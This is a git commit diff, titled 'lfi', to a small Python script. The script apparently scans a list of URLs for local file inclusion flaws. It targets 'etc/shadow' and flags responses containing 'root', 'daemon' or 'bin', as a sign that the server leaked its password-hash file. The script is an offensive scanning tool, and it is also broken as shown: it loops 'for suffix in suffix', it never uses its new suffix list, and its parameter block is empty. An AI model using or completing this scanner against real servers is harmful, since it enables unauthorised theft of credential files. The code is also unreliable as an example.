f0682d2321bc2985589866bfe43c4e8fce3a7c6a
LoaiEsam27 <loaiesam1199@gmail.com>
2022-10-18 18:38:30 +0200

    lfi

--- main.py
+++ main.py
@@ -12,19 +12,26 @@ def main():
     urls = re.split("\n", str(f.read()))
     f.close()
 
-    path_name = ["etc/shadow"] # suffix
+    suffixes = ["etc/shadow"] # suffix
     
     delay = 1 # time of delay between every request
 
+    # for every url
     for url in urls:
-
+        # for every prefix
         for prefix in prefixes:
+            # for every suffix
+            for suffix in suffix:
 
-            try:
+                # set params
+                                
+
+                # request
+                try:
                 
-
-                res = requests.get(url)
-                time.sleep(delay)
-                if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
-                    print(url)
-            except: pass
+                    res = requests.get(url)
+                    time.sleep(delay)
+                    if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
+                        print(url)
+                
+                except: pass
